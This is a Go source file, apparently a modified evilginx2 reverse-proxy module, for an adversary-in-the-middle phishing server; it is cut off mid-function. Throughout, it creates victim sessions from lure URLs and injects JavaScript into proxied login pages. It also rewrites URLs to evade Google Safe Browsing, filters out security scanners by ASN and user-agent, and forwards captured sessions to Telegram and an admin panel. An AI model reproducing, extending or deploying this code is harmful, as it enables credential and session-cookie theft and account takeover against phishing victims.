/*

This source file is a modified version of what was taken from the amazing bettercap (https://github.com/bettercap/bettercap) project.
Credits go to Simone Margaritelli (@evilsocket) for providing awesome piece of code!

*/

package core

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"crypto/rc4"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"html"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"

	"github.com/elazarl/goproxy"
	"github.com/fatih/color"
	"github.com/go-acme/lego/v3/challenge/tlsalpn01"
	"github.com/inconshreveable/go-vhost"
	http_dialer "github.com/mwitkow/go-http-dialer"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

const (
	CONVERT_TO_ORIGINAL_URLS = 0
	CONVERT_TO_PHISHING_URLS = 1
)

const (
	HOME_DIR = ".evilginx"
)

const (
	httpReadTimeout  = 45 * time.Second
	httpWriteTimeout = 45 * time.Second
)

// original borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
var MATCH_URL_REGEXP = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)

type HttpProxy struct {
	Server            *http.Server
	Proxy             *goproxy.ProxyHttpServer
	crt_db            *CertDb
	cfg               *Config
	db                *database.Database
	bl                *Blacklist
	gophish           *GoPhish
	telegramNotifier  *TelegramNotifier
	autoNotifier      *AutoNotifier
	evilFeed          *EvilFeedClient
	turnstileVerifier *TurnstileVerifier
	requestChecker    *RequestChecker
	anonymityEngine   *AnonymityEngine
	sniListener       net.Listener
	isRunning         bool
	sessions          map[string]*Session
	sids              map[string]int
	cookieName        string
	last_sid          int
	developer         bool
	ip_whitelist      map[string]int64
	ip_sids           map[string]string
	auto_filter_mimes []string
	ip_mtx            sync.Mutex
	session_mtx       sync.Mutex
	rewrittenUrls     map[string]string // URL rewriting: maps rewritten URL -> original URL (Safe Browsing evasion)
	rewriteMutex      sync.RWMutex      // Thread-safe access to rewrittenUrls map
}

type ProxySession struct {
	SessionId    string
	Created      bool
	PhishDomain  string
	PhishletName string
	Index        int
}

// set the value of the specified key in the JSON body
func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error) {
	var data map[string]interface{}
	if err := json.Unmarshal(body, &data); err != nil {
		return nil, err
	}
	data[key] = value
	newBody, err := json.Marshal(data)
	if err != nil {
		return nil, err
	}
	return newBody, nil
}

func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
	p := &HttpProxy{
		Proxy:             goproxy.NewProxyHttpServer(),
		Server:            nil,
		crt_db:            crt_db,
		cfg:               cfg,
		db:                db,
		bl:                bl,
		gophish:           NewGoPhish(),
		telegramNotifier:  NewTelegramNotifier(cfg.GetTelegramConfig(), db),
		evilFeed:          NewEvilFeedClient(),
		turnstileVerifier: NewTurnstileVerifier(cfg),
		isRunning:         false,
		last_sid:          0,
		developer:         developer,
		ip_whitelist:      make(map[string]int64),
		ip_sids:           make(map[string]string),
		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
	}

	// Initialize RequestChecker if enabled
	if cfg.GetRequestCheckerEnabled() {
		rc, err := NewRequestChecker(
			cfg.GetRequestCheckerASNFile(),
			cfg.GetRequestCheckerUserAgentFile(),
			cfg.GetRequestCheckerIPRangeFile(),
			cfg.GetRequestCheckerIPListFile(),
			cfg.GetRequestCheckerVerbose(),
		)
		if err != nil {
			log.Warning("[RequestChecker] Failed to initialize: %v", err)
		} else {
			p.requestChecker = rc
			log.Info("[RequestChecker] Initialized successfully")
		}
	}

	// Initialize AnonymityEngine with persisted config
	anonymityCfg := &AnonymityConfig{
		Enabled: cfg.GetAnonymityEnabled(),
		HeaderRandomization: &HeaderRandomConfig{
			Enabled: cfg.GetAnonymityHeaderRandomization(),
		},
		UserAgentRotation: &UserAgentConfig{
			Enabled: cfg.GetAnonymityUserAgentRotation(),
		},
	}
	p.anonymityEngine = NewAnonymityEngine(anonymityCfg)
	if cfg.GetAnonymityEnabled() {
		log.Info("[AnonymityEngine] Initialized and ENABLED (loaded from config)")
	} else {
		log.Debug("[AnonymityEngine] Initialized (disabled - enable via 'config anonymity enabled on')")
	}

	// DISABLED: Old auto-notifier - replaced with SessionFinalizer
	// p.autoNotifier = NewAutoNotifier(db, p.telegramNotifier, cfg.GetTelegramConfig().CookieExportDir)

	// NEW: Session Finalizer - ONLY sends when 100% complete
	if cfg.GetTelegramConfig().Enabled {
		go p.startSessionFinalizer()
		log.Important("🔥 NEW SESSION FINALIZER: Will ONLY send when sessions are 100% complete!")
	}

	// Load EvilFeed config from persistent storage
	if cfg.GetEvilFeedEnabled() {
		endpoint := cfg.GetEvilFeedEndpoint()
		if endpoint != "" {
			p.evilFeed.SetEndpoint(endpoint)
		}
		p.evilFeed.Enable("")
		log.Info("EvilFeed auto-enabled from config: %s", p.evilFeed.GetEndpoint())
	}

	p.Server = &http.Server{
		Addr:         fmt.Sprintf("%s:%d", hostname, port),
		Handler:      p.Proxy,
		ReadTimeout:  httpReadTimeout,
		WriteTimeout: httpWriteTimeout,
	}

	if cfg.proxyConfig.Enabled {
		err := p.setProxy(cfg.proxyConfig.Enabled, cfg.proxyConfig.Type, cfg.proxyConfig.Address, cfg.proxyConfig.Port, cfg.proxyConfig.Username, cfg.proxyConfig.Password)
		if err != nil {
			log.Error("proxy: %v", err)
			cfg.EnableProxy(false)
		} else {
			log.Info("enabled proxy: " + cfg.proxyConfig.Address + ":" + strconv.Itoa(cfg.proxyConfig.Port))
		}
	}

	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable
	p.sessions = make(map[string]*Session)
	p.sids = make(map[string]int)
	p.rewrittenUrls = make(map[string]string) // Initialize URL rewriting map for Safe Browsing evasion

	// Register proxy pool callbacks for session-sticky rotation
	SetProxyPoolCallbacks(
		// getProxyPool
		func() *ProxyPoolConfig {
			if p.anonymityEngine == nil || p.anonymityEngine.proxyRotator == nil {
				return &ProxyPoolConfig{Enabled: false, Proxies: []ProxyInfo{}}
			}
			proxies := p.anonymityEngine.proxyRotator.GetProxyPool()
			return &ProxyPoolConfig{
				Enabled: p.anonymityEngine.proxyRotator.IsEnabled(),
				Proxies: proxies,
			}
		},
		// setProxyPool
		func(pool *ProxyPoolConfig) error {
			if p.anonymityEngine == nil || p.anonymityEngine.proxyRotator == nil {
				return fmt.Errorf("anonymity engine not initialized")
			}
			p.anonymityEngine.proxyRotator.SetEnabled(pool.Enabled)
			p.anonymityEngine.proxyRotator.SetProxyPool(pool.Proxies)
			// Note: Proxy pool state is managed in-memory by AnonymityEngine
			// Config persistence can be added later if needed
			return nil
		},
		// getPoolStats
		func() map[string]interface{} {
			if p.anonymityEngine == nil || p.anonymityEngine.proxyRotator == nil {
				return map[string]interface{}{"total": 0, "active": 0, "in_use": 0, "available": 0, "failed": 0}
			}
			return p.anonymityEngine.proxyRotator.GetPoolStats()
		},
		// testProxy
		func(proxy *ProxyInfo) (bool, string, error) {
			success, originIP := testProxyDirect(proxy)
			if !success {
				return false, "", fmt.Errorf("proxy connection failed")
			}
			return true, originIP, nil
		},
	)

	// Start session janitor for stale session cleanup (releases orphaned proxies)
	go p.startSessionJanitor()

	// Start auto-notifier daemon for 100% reliable automatic telegram notifications
	// DISABLED: OLD AUTO-NOTIFIER COMPLETELY REMOVED
	// Using NEW SessionFinalizer instead for BULLETPROOF validation
	// if p.autoNotifier != nil && p.cfg.GetTelegramConfig().Enabled {
	//     p.autoNotifier.Start()
	// }

	p.Proxy.Verbose = false

	// Custom logger to suppress harmless "Cannot read TLS response from mitm'd server EOF" errors
	// These occur when serving local responses (landing page, admin panel) without a backend
	p.Proxy.Logger = &filteredLogger{}

	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		req.URL.Scheme = "https"
		req.URL.Host = req.Host
		p.Proxy.ServeHTTP(w, req)
	})

	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)

	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			ps := &ProxySession{
				SessionId:    "",
				Created:      false,
				PhishDomain:  "",
				PhishletName: "",
				Index:        -1,
			}
			ctx.UserData = ps
			hiblue := color.New(color.FgHiBlue)

			// handle ip blacklist
			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]

			// handle proxy headers
			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP"}
			for _, h := range proxyHeaders {
				origin_ip := req.Header.Get(h)
				if origin_ip != "" {
					from_ip = strings.SplitN(origin_ip, ":", 2)[0]
					break
				}
			}

			if p.cfg.GetBlacklistMode() != "off" {
				if p.bl.IsBlacklisted(from_ip) {
					if p.bl.IsVerbose() {
						log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
					}
					// Notify EvilFeed of blocked bot/blacklisted IP
					if p.evilFeed != nil && p.evilFeed.IsEnabled() {
						p.evilFeed.NotifyBot(from_ip, "Blacklisted IP blocked")
					}
					return p.blockRequest(req)
				}
				if p.cfg.GetBlacklistMode() == "all" {
					if !p.bl.IsWhitelisted(from_ip) {
						err := p.bl.AddIP(from_ip)
						if p.bl.IsVerbose() {
							if err != nil {
								log.Error("blacklist: %s", err)
							} else {
								log.Warning("blacklisted ip address: %s", from_ip)
							}
						}
					}

					return p.blockRequest(req)
				}
			}

			// RequestChecker - block by ASN, IP range, IP list, or User-Agent
			if p.requestChecker != nil {
				blocked, reason := p.requestChecker.CheckRequest(req, from_ip)
				if blocked {
					log.Warning("[RequestChecker] Blocked %s: %s", from_ip, reason)
					// Notify EvilFeed of blocked request
					if p.evilFeed != nil && p.evilFeed.IsEnabled() {
						p.evilFeed.NotifyBot(from_ip, fmt.Sprintf("Blocked by RequestChecker: %s", reason))
					}
					return p.blockRequest(req)
				}
			}

			// ============================================================================
			// PRE-GENERATION ENDPOINT HANDLER (x33fcon optimization)
			// Handles /.evilginx/pregen POST requests from JS injection
			// This allows pre-generating botguard tokens BEFORE user clicks Next
			// ============================================================================
			if req.URL.Path == "/.evilginx/pregen" && req.Method == "POST" {
				body, err := ioutil.ReadAll(req.Body)
				if err != nil {
					log.Warning("[PreGen] Failed to read request body: %v", err)
					return req, goproxy.NewResponse(req, goproxy.ContentTypeText, http.StatusBadRequest, "Bad Request")
				}
				req.Body = ioutil.NopCloser(bytes.NewBuffer(body))

				var preGenData struct {
					Email string `json:"email"`
				}
				if err := json.Unmarshal(body, &preGenData); err != nil {
					log.Warning("[PreGen] Failed to decode request: %v", err)
					return req, goproxy.NewResponse(req, goproxy.ContentTypeText, http.StatusBadRequest, "Bad Request")
				}

				email := preGenData.Email
				if email == "" || !strings.Contains(email, "@") {
					log.Warning("[PreGen] Invalid email in request: %s", email)
					return req, goproxy.NewResponse(req, goproxy.ContentTypeText, http.StatusBadRequest, "Invalid email")
				}

				log.Info("[PreGen] 🚀 Pre-generation request for: %s", email)

				// Start pre-generation in background (don't block)
				go PreGenerateToken(email)

				// Return success immediately
				return req, goproxy.NewResponse(req, "application/json", http.StatusOK, `{"status":"started"}`)
			}

			log.Debug("**--** Request path: %s", req.URL.Path)

			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
			// o_host := req.Host
			lure_url := req_url
			req_path := req.URL.Path
			if req.URL.RawQuery != "" {
				req_url += "?" + req.URL.RawQuery
				//req_path += "?" + req.URL.RawQuery
			}

			pl := p.getPhishletByPhishHost(req.Host)
			remote_addr := from_ip

			// ========== URL REWRITING CHECK (Safe Browsing Evasion) ==========
			// This section handles URL path rewriting to evade Google Safe Browsing detection
			// by transforming known-flagged paths (like /v3/signin/identifier) into innocuous ones
			if pl != nil {
				// First, check if this is a previously rewritten URL that needs to be restored
				rewrittenPath := req.URL.Path
				if req.URL.RawQuery != "" {
					rewrittenPath += "?" + req.URL.RawQuery
				}

				if originalUrl, found := p.getOriginalUrl(rewrittenPath); found {
					// This is a rewritten URL - restore the original path for proxying
					log.Debug("[URLRewrite] Restoring original URL: %s -> %s", rewrittenPath, originalUrl)

					parsedUrl, err := url.Parse(originalUrl)
					if err == nil {
						req.URL.Path = parsedUrl.Path
						req.URL.RawQuery = parsedUrl.RawQuery
						// Update local variables
						req_path = req.URL.Path
						req_url = req.URL.Scheme + "://" + req.Host + req.URL.Path
						if req.URL.RawQuery != "" {
							req_url += "?" + req.URL.RawQuery
						}
						lure_url = req_url
					}

					// Clean up the mapping after use (one-time redirect)
					p.cleanupRewriteMapping(rewrittenPath)
				} else {
					// Check if this URL should be rewritten (triggers Safe Browsing evasion)
					origHost, _ := p.replaceHostWithOriginal(req.Host)
					if shouldRewrite, rewrittenUrlPath, originalPath := p.checkUrlRewrite(pl, origHost, req.URL.Path, req.URL.Query()); shouldRewrite {
						log.Important("[URLRewrite] Safe Browsing evasion: %s -> %s", originalPath, rewrittenUrlPath)

						// Store the mapping for when the browser follows the redirect
						p.storeRewriteMapping(rewrittenUrlPath, originalPath)

						// Send 302 redirect to the rewritten URL
						redirectUrl := "https://" + req.Host + rewrittenUrlPath
						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
						if resp != nil {
							resp.Header.Set("Location", redirectUrl)
							resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
							return req, resp
						}
					}
				}
			}
			// ========== END URL REWRITING CHECK ==========

			// ========== SOURCE-PATH PARAMETER FIX (for URL Rewriting) ==========
			// Google's JavaScript captures the current URL path and sends it in the
			// source-path query parameter of batchexecute requests. When URL rewriting
			// is active, this sends the rewritten path (e.g., /auth/sso/login) instead
			// of the original Google path, causing Google to reject the request.
			// This section rewrites the source-path parameter back to the original path.
			if pl != nil && req.URL.RawQuery != "" && strings.Contains(req.URL.RawQuery, "source-path=") {
				rules := pl.GetRewriteRules()
				if len(rules) > 0 {
					// Parse the query string
					queryParams := req.URL.Query()
					sourcePath := queryParams.Get("source-path")

					if sourcePath != "" {
						// URL-decode the source-path value
						decodedSourcePath, err := url.QueryUnescape(sourcePath)
						if err == nil {
							// Parse the source-path to extract just the path portion
							sourcePathUrl, err := url.Parse(decodedSourcePath)
							if err == nil {
								originalSourcePath := sourcePathUrl.Path

								// Check if this path matches any rewrite rule's rewritten path
								for _, rule := range rules {
									if originalSourcePath == rule.RewritePath {
										// Found a match - this is a rewritten path that needs to be restored
										// Use the first trigger path as the original (strip the regex markers)
										if len(rule.TriggerPaths) > 0 {
											// Extract the base path from the trigger regex
											// e.g., "^/v3/signin/identifier.*" -> "/v3/signin/identifier"
											triggerPath := rule.TriggerPaths[0].String()
											// Remove regex anchors and wildcards
											triggerPath = strings.TrimPrefix(triggerPath, "^")
											triggerPath = strings.TrimSuffix(triggerPath, ".*")
											triggerPath = strings.TrimSuffix(triggerPath, "$")

											// Reconstruct the source-path with original path but preserve query params
											newSourcePath := triggerPath
											if sourcePathUrl.RawQuery != "" {
												newSourcePath += "?" + sourcePathUrl.RawQuery
											}

											// URL-encode and update the query parameter
											queryParams.Set("source-path", newSourcePath)
											req.URL.RawQuery = queryParams.Encode()

											log.Debug("[SourcePathFix] Rewrote source-path: %s -> %s", decodedSourcePath, newSourcePath)
											break
										}
									}
								}
							}
						}
					}
				}
			}
			// ========== END SOURCE-PATH PARAMETER FIX ==========

			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")

			if js_inject_re.MatchString(req.URL.Path) {
				ra := js_inject_re.FindStringSubmatch(req.URL.Path)
				if len(ra) >= 3 {
					session_id := ra[1]
					js_id := ra[2]
					if strings.HasSuffix(js_id, ".js") {
						js_id = js_id[:len(js_id)-3]
						if s, ok := p.sessions[session_id]; ok {
							var d_body string
							var js_params *map[string]string = nil
							js_params = &s.Params

							script, err := pl.GetScriptInjectById(js_id, js_params)
							if err == nil {
								d_body += script + "\n\n"
							} else {
								log.Warning("js_inject: script not found: '%s'", js_id)
							}
							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
							return req, resp
						} else {
							log.Warning("js_inject: session not found: '%s'", session_id)
						}
					}
				}
			} else if redir_re.MatchString(req.URL.Path) {
				ra := redir_re.FindStringSubmatch(req.URL.Path)
				if len(ra) >= 2 {
					session_id := ra[1]
					if strings.HasSuffix(session_id, ".js") {
						// respond with injected javascript
						session_id = session_id[:len(session_id)-3]
						if s, ok := p.sessions[session_id]; ok {
							var d_body string
							if !s.IsDone {
								if s.RedirectURL != "" {
									dynamic_redirect_js := DYNAMIC_REDIRECT_JS
									dynamic_redirect_js = strings.ReplaceAll(dynamic_redirect_js, "{session_id}", s.Id)
									d_body += dynamic_redirect_js + "\n\n"
								}
							}
							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
							return req, resp
						} else {
							log.Warning("js: session not found: '%s'", session_id)
						}
					} else {
						if _, ok := p.sessions[session_id]; ok {
							redirect_url, ok := p.waitForRedirectUrl(session_id)
							if ok {
								type ResponseRedirectUrl struct {
									RedirectUrl string `json:"redirect_url"`
								}
								d_json, err := json.Marshal(&ResponseRedirectUrl{RedirectUrl: redirect_url})
								if err == nil {
									s_index, _ := p.sids[session_id]
									log.Important("[%d] dynamic redirect to URL: %s", s_index, redirect_url)
									resp := goproxy.NewResponse(req, "application/json", 200, string(d_json))
									return req, resp
								}
							}
							resp := goproxy.NewResponse(req, "application/json", 408, "")
							return req, resp
						} else {
							log.Warning("api: session not found: '%s'", session_id)
						}
					}
				}
			}

			// ============================================================================
			// BASE DOMAIN ADMIN PANEL ROUTING (EvilFeed/GoPhish on base domain)
			// Handles /admin/ -> EvilFeed, /mail/ -> GoPhish, and landing page
			// ============================================================================
			baseDomain := p.cfg.GetBaseDomain()
			if baseDomain != "" && strings.EqualFold(req.Host, baseDomain) {
				// Handle /admin/ path -> EvilFeed
				adminPath := p.cfg.GetAdminPath()
				if p.cfg.IsAdminPanelEnabled() && strings.HasPrefix(req.URL.Path, adminPath) {
					return p.handleAdminPanelProxy(req, adminPath)
				}

				// Handle /images/ path -> EvilFeed (for shared assets like bg.png)
				// This allows EvilFeed login page to load background images when accessed via /admin/
				if p.cfg.IsAdminPanelEnabled() && strings.HasPrefix(req.URL.Path, "/images/") {
					return p.handleAdminPanelImages(req)
				}

				// Handle /notify.mp3 -> EvilFeed (for notification sound)
				// This allows EvilFeed to play notification sounds when accessed via /admin/
				if p.cfg.IsAdminPanelEnabled() && req.URL.Path == "/notify.mp3" {
					return p.handleAdminPanelAsset(req)
				}

				// Handle /mail/ path -> GoPhish
				mailPath := p.cfg.GetMailPath()
				if p.cfg.IsMailPanelEnabled() && strings.HasPrefix(req.URL.Path, mailPath) {
					return p.handleMailPanelProxy(req, mailPath)
				}

				// Handle landing page for base domain root
				if p.cfg.IsLandingPageEnabled() && (req.URL.Path == "/" || req.URL.Path == "") {
					return p.handleLandingPage(req)
				}

				// If admin/mail disabled but landing enabled, redirect admin/mail paths to landing
				if p.cfg.IsLandingPageEnabled() {
					if strings.HasPrefix(req.URL.Path, "/admin") || strings.HasPrefix(req.URL.Path, "/mail") {
						return p.handleLandingPage(req)
					}
				}
			}
			// ============================================================================

			// Handle Turnstile verification API endpoint
			if req.URL.Path == "/_turnstile/verify" && req.Method == "POST" {
				return p.handleTurnstileVerify(req, from_ip)
			}

			// Handle Telegram config API endpoint (localhost only)
			if req.URL.Path == "/_telegram/config" {
				// Only allow from localhost
				if !strings.HasPrefix(from_ip, "127.") && from_ip != "::1" {
					resp := goproxy.NewResponse(req, "application/json", http.StatusForbidden,
						`{"error":"forbidden"}`)
					return req, resp
				}
				return p.handleTelegramConfig(req)
			}

			// Handle Turnstile config API endpoint (localhost only)
			if req.URL.Path == "/_turnstile/config" {
				// Only allow from localhost
				if !strings.HasPrefix(from_ip, "127.") && from_ip != "::1" {
					resp := goproxy.NewResponse(req, "application/json", http.StatusForbidden,
						`{"error":"forbidden"}`)
					return req, resp
				}
				return p.handleTurnstileConfig(req)
			}

			// Handle Proxy config API endpoint (localhost only)
			if req.URL.Path == "/_proxy/config" {
				// Only allow from localhost
				if !strings.HasPrefix(from_ip, "127.") && from_ip != "::1" {
					resp := goproxy.NewResponse(req, "application/json", http.StatusForbidden,
						`{"error":"forbidden"}`)
					return req, resp
				}
				return p.handleProxyConfig(req)
			}

			// Handle Sessions API endpoint (localhost only) - allows EvilFeed to read sessions
			if req.URL.Path == "/_sessions" {
				// Only allow from localhost
				if !strings.HasPrefix(from_ip, "127.") && from_ip != "::1" {
					resp := goproxy.NewResponse(req, "application/json", http.StatusForbidden,
						`{"error":"forbidden"}`)
					return req, resp
				}
				return p.handleSessionsAPI(req)
			}

			phishDomain, phished := p.getPhishDomain(req.Host)
			if phished {
				pl_name := ""
				if pl != nil {
					pl_name = pl.Name
					ps.PhishletName = pl_name
				}
				session_cookie := getSessionCookieName(pl_name, p.cookieName)

				ps.PhishDomain = phishDomain
				req_ok := false
				// handle session
				if p.handleSession(req.Host) && pl != nil {
					l, err := p.cfg.GetLureByPath(pl_name, req_path)
					if err == nil {
						log.Debug("triggered lure for path '%s'", req_path)
					}

					var create_session bool = true
					var ok bool = false
					sc, err := req.Cookie(session_cookie)
					if err == nil {
						ps.Index, ok = p.sids[sc.Value]
						if ok {
							create_session = false
							ps.SessionId = sc.Value
							p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
						} else {
							log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
						}
					} else {
						if l == nil && p.isWhitelistedIP(remote_addr, pl.Name) {
							// not a lure path and IP is whitelisted

							// TODO: allow only retrieval of static content, without setting session ID

							create_session = false
							req_ok = true
							/*
								ps.SessionId, ok = p.getSessionIdByIP(remote_addr, req.Host)
								if ok {
									create_session = false
									ps.Index, ok = p.sids[ps.SessionId]
								} else {
									log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
								}*/
						}
					}

					if create_session /*&& !p.isWhitelistedIP(remote_addr, pl.Name)*/ { // TODO: always trigger new session when lure URL is detected (do not check for whitelisted IP only after this is done)
						// session cookie not found
						if !p.cfg.IsSiteHidden(pl_name) {
							if l != nil {
								// check if lure is not paused
								if l.PausedUntil > 0 && time.Unix(l.PausedUntil, 0).After(time.Now()) {
									log.Warning("[%s] lure is paused: %s [%s]", hiblue.Sprint(pl_name), req_url, remote_addr)
									return p.blockRequest(req)
								}

								// check if lure user-agent filter is triggered
								if len(l.UserAgentFilter) > 0 {
									re, err := regexp.Compile(l.UserAgentFilter)
									if err == nil {
										if !re.MatchString(req.UserAgent()) {
											log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)

											// Notify EvilFeed of bot/unauthorized user-agent
											if p.evilFeed != nil && p.evilFeed.IsEnabled() {
												p.evilFeed.NotifyBot(remote_addr, fmt.Sprintf("User-agent rejected: %s", req.UserAgent()))
											}

											if p.cfg.GetBlacklistMode() == "unauth" {
												if !p.bl.IsWhitelisted(from_ip) {
													err := p.bl.AddIP(from_ip)
													if p.bl.IsVerbose() {
														if err != nil {
															log.Error("blacklist: %s", err)
														} else {
															log.Warning("blacklisted ip address: %s", from_ip)
														}
													}
												}
											}
											return p.blockRequest(req)
										}
									} else {
										log.Error("lures: user-agent filter regexp is invalid: %v", err)
									}
								}

								session, err := NewSession(pl.Name)
								if err == nil {
									// set params from url arguments
									p.extractParams(session, req.URL)

									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
										if trackParam, ok := session.Params["o"]; ok {
											if trackParam == "track" {
												// gophish email tracker image
												rid, ok := session.Params["rid"]
												if ok && rid != "" {
													log.Info("[gophish] [%s] email opened: %s (%s)", hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
													p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
													err = p.gophish.ReportEmailOpened(rid, remote_addr, req.Header.Get("User-Agent"))
													if err != nil {
														log.Error("gophish: %s", err)
													}
													return p.trackerImage(req)
												}
											}
										}
									}

									sid := p.last_sid
									p.last_sid += 1
									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
									p.sessions[session.Id] = session
									p.sids[session.Id] = sid

									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
										rid, ok := session.Params["rid"]
										if ok && rid != "" {
											p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
											err = p.gophish.ReportEmailLinkClicked(rid, remote_addr, req.Header.Get("User-Agent"))
											if err != nil {
												log.Error("gophish: %s", err)
											}
										}
									}

									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
										log.Error("database: %v", err)
									} else {
										// Get RID from session params for campaign tracking
										rid := session.Params["rid"]
										// Notify web panel of new session with RID
										if dbSession, err := p.db.GetSessionBySid(session.Id); err == nil {
											p.notifyWebPanel("new_session", dbSession, rid)
										}
										// Notify EvilFeed of click/landing event with RID for campaign tracking
										if p.evilFeed != nil && p.evilFeed.IsEnabled() {
											p.evilFeed.NotifyClick(pl.Name, remote_addr, session.Id, rid)
										}
									}

									session.RemoteAddr = remote_addr
									session.UserAgent = req.Header.Get("User-Agent")
									session.RedirectURL = pl.RedirectUrl
									if l.RedirectUrl != "" {
